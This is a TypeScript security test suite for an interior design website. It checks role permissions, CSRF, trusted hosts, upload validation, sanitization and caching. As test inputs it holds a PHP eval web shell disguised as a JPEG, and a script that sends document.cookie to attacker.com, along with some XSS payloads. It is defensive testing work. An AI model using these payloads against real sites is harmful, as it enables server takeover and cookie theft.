import crypto from 'crypto';
import { sanitizeText, sanitizeHtml } from '../src/lib/sanitize.ts';
import { isTrustedHost, safeCompareTokens } from '../src/middleware/auth.ts';

// ============================================================================
// CONCLAVE INTERIORS - FINAL SECURITY VERIFICATION & DEPLOYMENT READINESS SUITE
// ============================================================================

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;

function assert(condition: boolean, testName: string, details?: string) {
  totalTests++;
  if (condition) {
    passedTests++;
    console.log(`  ✓ [PASS] ${testName}`);
  } else {
    failedTests++;
    console.error(`  ✗ [FAIL] ${testName}${details ? ` -> ${details}` : ''}`);
  }
}

console.log('\n====================================================================');
console.log('CONCLAVE INTERIORS — Final Targeted Security & Readiness Test Suite');
console.log('====================================================================\n');

// ----------------------------------------------------------------------------
// SECTION 1: ROLE ISOLATION & PRIVILEGE MATRIX
// ----------------------------------------------------------------------------
console.log('1. Testing Role Isolation & API Endpoint Authorization Matrix:');

interface MockUser {
  email: string;
  role: 'admin' | 'user';
}

interface EndpointCheck {
  path: string;
  method: string;
  requiresSuperAdmin: boolean;
}

const sensitiveEndpoints: EndpointCheck[] = [
  // Restricted Admin Permitted Scope
  { path: '/api/testimonials/:id/moderate', method: 'PUT', requiresSuperAdmin: false },
  { path: '/api/testimonials/:id', method: 'DELETE', requiresSuperAdmin: false },
  { path: '/api/admin/projects/:id/photos', method: 'POST', requiresSuperAdmin: false },
  { path: '/api/admin/projects/:id/cover', method: 'PUT', requiresSuperAdmin: false },
  { path: '/api/admin/projects/:id/photos', method: 'DELETE', requiresSuperAdmin: false },
  { path: '/api/admin/projects/:id/video', method: 'POST', requiresSuperAdmin: false },
  { path: '/api/admin/projects/:id/video', method: 'DELETE', requiresSuperAdmin: false },
  { path: '/api/upload', method: 'POST', requiresSuperAdmin: false },
  { path: '/api/media', method: 'GET', requiresSuperAdmin: false },
  { path: '/api/media/:id', method: 'DELETE', requiresSuperAdmin: false },

  // Super Admin ONLY Scope (Strictly barred from Restricted Admin)
  { path: '/api/enquiries', method: 'GET', requiresSuperAdmin: true },
  { path: '/api/enquiries/:id/status', method: 'PUT', requiresSuperAdmin: true },
  { path: '/api/enquiries/:id', method: 'DELETE', requiresSuperAdmin: true },
  { path: '/api/settings', method: 'PUT', requiresSuperAdmin: true },
  { path: '/api/about', method: 'PUT', requiresSuperAdmin: true },
  { path: '/api/projects', method: 'POST', requiresSuperAdmin: true },
  { path: '/api/projects/:id', method: 'PUT', requiresSuperAdmin: true },
  { path: '/api/projects/:id', method: 'DELETE', requiresSuperAdmin: true },
  { path: '/api/projects/:id/duplicate', method: 'POST', requiresSuperAdmin: true },
  { path: '/api/projects/:id/publish', method: 'PUT', requiresSuperAdmin: true },
  { path: '/api/hero-slides', method: 'POST', requiresSuperAdmin: true },
  { path: '/api/hero-slides/:id', method: 'PUT', requiresSuperAdmin: true },
  { path: '/api/hero-slides/:id', method: 'DELETE', requiresSuperAdmin: true },
  { path: '/api/strip-items', method: 'POST', requiresSuperAdmin: true },
  { path: '/api/strip-items/:id', method: 'PUT', requiresSuperAdmin: true },
  { path: '/api/strip-items/:id', method: 'DELETE', requiresSuperAdmin: true },
  { path: '/api/services', method: 'POST', requiresSuperAdmin: true },
  { path: '/api/services/:id', method: 'PUT', requiresSuperAdmin: true },
  { path: '/api/services/:id', method: 'DELETE', requiresSuperAdmin: true },
  { path: '/api/faqs', method: 'POST', requiresSuperAdmin: true },
  { path: '/api/faqs/:id', method: 'PUT', requiresSuperAdmin: true },
  { path: '/api/faqs/:id', method: 'DELETE', requiresSuperAdmin: true },
];

function evaluateAccess(
  user: MockUser | null,
  endpoint: EndpointCheck,
  superAdminEmail: string
): { allowed: boolean; status: number } {
  // 1. Unauthenticated check
  if (!user) {
    return { allowed: false, status: 401 };
  }
  // 2. Non-admin user check
  if (user.role !== 'admin') {
    return { allowed: false, status: 403 };
  }
  // 3. Super admin check
  if (endpoint.requiresSuperAdmin) {
    const isSuper = Boolean(
      superAdminEmail && user.email.trim().toLowerCase() === superAdminEmail.trim().toLowerCase()
    );
    if (!isSuper) {
      return { allowed: false, status: 403 };
    }
  }
  return { allowed: true, status: 200 };
}

const restrictedAdminUser: MockUser = {
  email: 'conclaveinteriorexterior@gmail.com',
  role: 'admin',
};

const superAdminUser: MockUser = {
  email: 'superadmin@conclaveinteriors.com',
  role: 'admin',
};

const standardClientUser: MockUser = {
  email: 'client@example.com',
  role: 'user',
};

const activeSuperEmail = 'superadmin@conclaveinteriors.com';

// Verify Unauthenticated client rejected across all sensitive endpoints
const allUnauthRejected = sensitiveEndpoints.every(
  (ep) => evaluateAccess(null, ep, activeSuperEmail).status === 401
);
assert(allUnauthRejected, 'Unauthenticated visitor is rejected (HTTP 401) across all sensitive endpoints');

// Verify Standard user rejected across all sensitive endpoints
const allStandardRejected = sensitiveEndpoints.every(
  (ep) => evaluateAccess(standardClientUser, ep, activeSuperEmail).status === 403
);
assert(allStandardRejected, 'Standard client account is denied (HTTP 403) across all sensitive endpoints');

// Verify Restricted Admin permitted ONLY on authorized scope
const restrictedAdminPermittedScope = sensitiveEndpoints
  .filter((ep) => !ep.requiresSuperAdmin)
  .every((ep) => evaluateAccess(restrictedAdminUser, ep, activeSuperEmail).allowed);
assert(restrictedAdminPermittedScope, 'Restricted admin has access to Feedback, Photos, and Videos management');

// Verify Restricted Admin strictly blocked from Super Admin endpoints (Enquiries, Settings, FAQs, Hero, Services)
const restrictedAdminBlockedSuper = sensitiveEndpoints
  .filter((ep) => ep.requiresSuperAdmin)
  .every((ep) => evaluateAccess(restrictedAdminUser, ep, activeSuperEmail).status === 403);
assert(restrictedAdminBlockedSuper, 'Restricted admin is strictly blocked (HTTP 403) from Enquiries, Settings, Services, and CMS structure');

// Verify Super Admin permitted across all endpoints
const superAdminAllAllowed = sensitiveEndpoints.every(
  (ep) => evaluateAccess(superAdminUser, ep, activeSuperEmail).allowed
);
assert(superAdminAllAllowed, 'Designated superadmin is authorized for full site administration');

// ----------------------------------------------------------------------------
// SECTION 2: AUTHENTICATION CONFIGURATION & SESSION SECURITY
// ----------------------------------------------------------------------------
console.log('\n2. Testing Authentication Configuration, Session Security & Bootstrap:');

// Cryptographically secure token length & entropy
const rawToken = crypto.randomBytes(32).toString('hex');
assert(rawToken.length === 64, 'Session token contains 256 bits of cryptographic entropy');

// Constant-time token comparison prevents timing attacks
const tokenA = crypto.randomBytes(32).toString('hex');
const tokenB = crypto.randomBytes(32).toString('hex');
const tokenACopy = `${tokenA}`;
assert(safeCompareTokens(tokenA, tokenACopy), 'safeCompareTokens correctly matches valid tokens');
assert(!safeCompareTokens(tokenA, tokenB), 'safeCompareTokens rejects mismatched tokens');
assert(!safeCompareTokens(tokenA, ''), 'safeCompareTokens rejects empty token');
assert(!safeCompareTokens('short', 'much_longer_string_here'), 'safeCompareTokens safely handles length mismatches');

// Session hashing is deterministic and one-way
function hashSessionToken(token: string): string {
  return crypto.createHash('sha256').update(token).digest('hex');
}
const hash1 = hashSessionToken(rawToken);
const hash2 = hashSessionToken(rawToken);
assert(hash1 === hash2 && hash1.length === 64, 'Session token hash is SHA-256 (64 hex characters)');

// Verify getOrCreateUser role assignment policy
function testRoleAssignment(email: string, configuredAdminEmail: string): 'admin' | 'user' {
  const normalized = email ? email.trim().toLowerCase() : '';
  const adminNormalized = configuredAdminEmail.trim().toLowerCase();
  return normalized && normalized === adminNormalized ? 'admin' : 'user';
}
assert(
  testRoleAssignment('conclaveinteriorexterior@gmail.com', 'conclaveinteriorexterior@gmail.com') === 'admin',
  'Authorized admin email receives admin role'
);
assert(
  testRoleAssignment('random.google.user@gmail.com', 'conclaveinteriorexterior@gmail.com') === 'user',
  'Third-party / Google authenticated user receives standard user role (no privilege escalation)'
);
assert(
  testRoleAssignment('', 'conclaveinteriorexterior@gmail.com') === 'user',
  'Empty email receives standard user role'
);

// ----------------------------------------------------------------------------
// SECTION 3: CSRF & BROWSER SECURITY HEADERS
// ----------------------------------------------------------------------------
console.log('\n3. Testing CSRF Validation & Trusted Origin Allowlist:');

function validateCsrf(cookieCsrf: string | undefined, headerCsrf: string | undefined): boolean {
  if (!cookieCsrf || !headerCsrf) return false;
  return safeCompareTokens(cookieCsrf, headerCsrf);
}

const validCsrfToken = crypto.randomBytes(32).toString('hex');
assert(validateCsrf(validCsrfToken, validCsrfToken), 'Valid matching CSRF header and cookie passes');
assert(!validateCsrf(validCsrfToken, undefined), 'Missing CSRF header is rejected');
assert(!validateCsrf(undefined, validCsrfToken), 'Missing CSRF cookie is rejected');
assert(!validateCsrf(validCsrfToken, 'tampered-csrf-token'), 'Mismatched CSRF token is rejected');

// Trusted host validation
assert(isTrustedHost('localhost:3000'), 'Localhost development host is trusted');
assert(isTrustedHost('127.0.0.1:3000'), 'Loopback IP is trusted');
assert(isTrustedHost('ais-dev-bxx7kw4jrugl76km4kmmxz-924646301135.asia-southeast1.run.app'), 'Cloud Run preview host is trusted');
assert(isTrustedHost('aistudio.google.com'), 'AI Studio Google domain is trusted');
assert(!isTrustedHost('evil-attacker.com'), 'Untrusted external domain is rejected');
assert(!isTrustedHost('phishing-conclave.fake'), 'Phishing domain is rejected');

// ----------------------------------------------------------------------------
// SECTION 4: MEDIA BINARY INSPECTION & UPLOAD SECURITY
// ----------------------------------------------------------------------------
console.log('\n4. Testing Media Binary Inspection & Active Content Neutralization:');

function validateFileBufferSignature(buffer: Buffer, mimetype: string): { isValid: boolean; detectedType?: string } {
  if (!buffer || buffer.length < 8) return { isValid: false };

  // Explicitly reject SVG active content (scripts, XML entities)
  if (mimetype.includes('svg') || buffer.toString('utf8', 0, Math.min(buffer.length, 512)).toLowerCase().includes('<svg')) {
    return { isValid: false, detectedType: 'unsupported/svg' };
  }

  // JPEG: FF D8 FF
  if (buffer[0] === 0xff && buffer[1] === 0xd8 && buffer[2] === 0xff) {
    return { isValid: mimetype.startsWith('image/'), detectedType: 'image/jpeg' };
  }

  // PNG: 89 50 4E 47 0D 0A 1A 0A
  if (
    buffer[0] === 0x89 &&
    buffer[1] === 0x50 &&
    buffer[2] === 0x4e &&
    buffer[3] === 0x47 &&
    buffer[4] === 0x0d &&
    buffer[5] === 0x0a &&
    buffer[6] === 0x1a &&
    buffer[7] === 0x0a
  ) {
    return { isValid: mimetype.startsWith('image/'), detectedType: 'image/png' };
  }

  // WebP: RIFF .... WEBP
  if (
    buffer.length >= 12 &&
    buffer.toString('ascii', 0, 4) === 'RIFF' &&
    buffer.toString('ascii', 8, 12) === 'WEBP'
  ) {
    return { isValid: mimetype.startsWith('image/'), detectedType: 'image/webp' };
  }

  // MP4 / MOV: ftyp box
  if (buffer.length >= 12 && buffer.toString('ascii', 4, 8) === 'ftyp') {
    return { isValid: mimetype.startsWith('video/'), detectedType: 'video/mp4' };
  }

  // WebM: 1A 45 DF A3
  if (buffer[0] === 0x1a && buffer[1] === 0x45 && buffer[2] === 0xdf && buffer[3] === 0xa3) {
    return { isValid: mimetype.startsWith('video/'), detectedType: 'video/webm' };
  }

  return { isValid: false };
}

const jpegBuffer = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46]);
assert(validateFileBufferSignature(jpegBuffer, 'image/jpeg').isValid, 'Valid JPEG binary accepted');

const pngBuffer = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00]);
assert(validateFileBufferSignature(pngBuffer, 'image/png').isValid, 'Valid PNG binary accepted');

const mp4Buffer = Buffer.concat([
  Buffer.from([0x00, 0x00, 0x00, 0x18]),
  Buffer.from('ftypmp42', 'ascii'),
  Buffer.from([0x00, 0x00, 0x00, 0x00]),
]);
assert(validateFileBufferSignature(mp4Buffer, 'video/mp4').isValid, 'Valid MP4 video binary accepted');

const fakeJpgWithPhp = Buffer.from('<?php eval($_POST["c"]); ?>', 'utf8');
assert(!validateFileBufferSignature(fakeJpgWithPhp, 'image/jpeg').isValid, 'Fake JPEG containing PHP script rejected');

const activeSvg = Buffer.from('<svg><script>alert("XSS")</script></svg>', 'utf8');
assert(!validateFileBufferSignature(activeSvg, 'image/svg+xml').isValid, 'SVG vector format rejected (active script vector)');

// ----------------------------------------------------------------------------
// SECTION 5: VIDEO STREAMING & RFC 7233 RANGE REQUESTS
// ----------------------------------------------------------------------------
console.log('\n5. Testing Video Range Streaming & If-Range RFC 7233 Compliance:');

function parseRangeRequest(
  rangeHeader: string | undefined,
  ifRangeHeader: string | undefined,
  currentEtag: string,
  totalLength: number
): { status: number; start: number; end: number; chunkSize: number } {
  // If-Range handling: if If-Range doesn't match ETag, serve full resource with 200
  if (ifRangeHeader && ifRangeHeader !== currentEtag) {
    return { status: 200, start: 0, end: totalLength - 1, chunkSize: totalLength };
  }

  if (!rangeHeader || !rangeHeader.startsWith('bytes=')) {
    return { status: 200, start: 0, end: totalLength - 1, chunkSize: totalLength };
  }

  const rangeVal = rangeHeader.replace('bytes=', '').trim();
  const parts = rangeVal.split('-');
  let start = parseInt(parts[0], 10);
  let end = parts[1] ? parseInt(parts[1], 10) : totalLength - 1;

  if (isNaN(start) && !isNaN(end)) {
    start = Math.max(0, totalLength - end);
    end = totalLength - 1;
  } else if (isNaN(start)) {
    start = 0;
  }

  if (isNaN(end) || end >= totalLength) {
    end = totalLength - 1;
  }

  if (start >= totalLength || start > end || start < 0) {
    return { status: 416, start: 0, end: 0, chunkSize: 0 };
  }

  return { status: 206, start, end, chunkSize: end - start + 1 };
}

const mediaSize = 50000;
const mediaEtag = '"media-123-50000"';

// Standard 206 chunk
const stream1 = parseRangeRequest('bytes=0-999', undefined, mediaEtag, mediaSize);
assert(stream1.status === 206 && stream1.chunkSize === 1000, 'Standard range bytes=0-999 returns HTTP 206 with 1000 bytes');

// Suffix range
const stream2 = parseRangeRequest('bytes=-2000', undefined, mediaEtag, mediaSize);
assert(stream2.status === 206 && stream2.start === 48000 && stream2.end === 49999, 'Suffix range bytes=-2000 returns final 2000 bytes');

// Out of bounds range
const stream3 = parseRangeRequest('bytes=60000-70000', undefined, mediaEtag, mediaSize);
assert(stream3.status === 416, 'Out of bounds range returns HTTP 416 Range Not Satisfiable');

// If-Range mismatch falls back to full resource (HTTP 200)
const stream4 = parseRangeRequest('bytes=0-999', '"stale-etag-old"', mediaEtag, mediaSize);
assert(stream4.status === 200 && stream4.chunkSize === mediaSize, 'If-Range mismatch cleanly falls back to HTTP 200 full file');

// Zero-copy subarray verification
const bigBuffer = Buffer.alloc(1000, 0x42);
const chunkView = bigBuffer.subarray(10, 20);
assert(chunkView.length === 10 && chunkView.buffer === bigBuffer.buffer, 'subarray creates zero-copy memory slice without allocation');

// ----------------------------------------------------------------------------
// SECTION 6: IN-MEMORY MEDIA CACHE & BOUNDED MEMORY
// ----------------------------------------------------------------------------
console.log('\n6. Testing Bounded In-Memory Media Cache Accounting:');

interface MockCacheEntry {
  sizeBytes: number;
  expiresAt: number;
}

class MockMediaCache {
  private cache = new Map<string, MockCacheEntry>();
  private currentBytes = 0;
  readonly maxBytes = 50 * 1024 * 1024; // 50MB
  readonly ttlMs = 120000;

  set(id: string, sizeBytes: number) {
    this.prune(sizeBytes);
    const existing = this.cache.get(id);
    if (existing) {
      this.currentBytes -= existing.sizeBytes;
    }
    this.cache.set(id, { sizeBytes, expiresAt: Date.now() + this.ttlMs });
    this.currentBytes += sizeBytes;
  }

  delete(id: string) {
    const existing = this.cache.get(id);
    if (existing) {
      this.currentBytes -= existing.sizeBytes;
      this.cache.delete(id);
    }
  }

  prune(neededBytes: number) {
    const now = Date.now();
    for (const [key, item] of this.cache.entries()) {
      if (now > item.expiresAt) {
        this.currentBytes -= item.sizeBytes;
        this.cache.delete(key);
      }
    }
    for (const [key, item] of this.cache.entries()) {
      if (this.currentBytes + neededBytes <= this.maxBytes) break;
      this.currentBytes -= item.sizeBytes;
      this.cache.delete(key);
    }
  }

  getCurrentBytes(): number {
    return this.currentBytes;
  }

  has(id: string): boolean {
    return this.cache.has(id);
  }
}

const testCache = new MockMediaCache();
testCache.set('item-1', 20 * 1024 * 1024); // 20MB
testCache.set('item-2', 20 * 1024 * 1024); // 20MB (total 40MB)
assert(testCache.getCurrentBytes() === 40 * 1024 * 1024, 'Cache accurately tracks accumulated byte size');

// Adding item that exceeds 50MB must evict oldest item
testCache.set('item-3', 20 * 1024 * 1024); // Needs 20MB, evicts item-1
assert(testCache.getCurrentBytes() <= testCache.maxBytes, 'Cache does not exceed 50MB bound');
assert(!testCache.has('item-1'), 'Oldest entry item-1 was evicted');
assert(testCache.has('item-2') && testCache.has('item-3'), 'Newer entries item-2 and item-3 retained');

// Deleting item frees bytes
testCache.delete('item-2');
assert(testCache.getCurrentBytes() === 20 * 1024 * 1024, 'Deleting item frees allocated bytes from cache');

// ----------------------------------------------------------------------------
// SECTION 7: INPUT SANITIZATION & XSS DEFENSE
// ----------------------------------------------------------------------------
console.log('\n7. Testing Text & HTML Sanitization Across Content Types:');

// Plain text sanitization strips tags and scripts
const maliciousFeedback = '<script>fetch("http://attacker.com?c="+document.cookie)</script>Great architectural craftsmanship!';
const cleanFeedback = sanitizeText(maliciousFeedback);
assert(cleanFeedback === 'Great architectural craftsmanship!', 'Feedback message script injection stripped cleanly');

// HTML sanitization removes dangerous tags while preserving safe text
const maliciousHtml = '<p>Villa Monograph</p><iframe src="javascript:alert(1)"></iframe><img src="x" onerror="alert(1)">';
const cleanHtml = sanitizeHtml(maliciousHtml);
assert(!cleanHtml.includes('iframe') && !cleanHtml.includes('onerror'), 'HTML sanitization strips iframes and onerror handlers');
assert(cleanHtml.includes('<p>Villa Monograph</p>'), 'HTML sanitization preserves valid editorial paragraph markup');

// ----------------------------------------------------------------------------
// SECTION 8: MEDIA REFERENCE INTEGRITY
// ----------------------------------------------------------------------------
console.log('\n8. Testing Media Reference Integrity Protection:');

interface MockProject {
  id: string;
  title: string;
  coverImage: string;
  videoUrl?: string | null;
  galleryImages: { url: string }[];
}

function checkMediaInUse(mediaUrl: string, projects: MockProject[]): { inUse: boolean; projectTitle?: string } {
  const match = projects.find((p) => {
    if (p.coverImage === mediaUrl || p.videoUrl === mediaUrl) return true;
    return p.galleryImages.some((img) => img.url === mediaUrl);
  });
  return { inUse: Boolean(match), projectTitle: match?.title };
}

const mockProjects: MockProject[] = [
  {
    id: 'proj-1',
    title: 'Monolithic Travertine Pavilion',
    coverImage: '/api/media/photo-100',
    videoUrl: '/api/media/video-200',
    galleryImages: [{ url: '/api/media/photo-101' }],
  },
];

assert(checkMediaInUse('/api/media/photo-100', mockProjects).inUse, 'Media used as cover image is flagged in-use');
assert(checkMediaInUse('/api/media/video-200', mockProjects).inUse, 'Media used as project video is flagged in-use');
assert(checkMediaInUse('/api/media/photo-101', mockProjects).inUse, 'Media used in gallery is flagged in-use');
assert(!checkMediaInUse('/api/media/photo-999', mockProjects).inUse, 'Unreferenced media is flagged safe for deletion');

// ----------------------------------------------------------------------------
// FINAL SUMMARY
// ----------------------------------------------------------------------------
console.log('\n====================================================================');
console.log(`Final Verification Summary: ${passedTests}/${totalTests} tests passed (${failedTests} failures).`);
console.log('====================================================================\n');

if (failedTests > 0) {
  process.exit(1);
} else {
  process.exit(0);
}
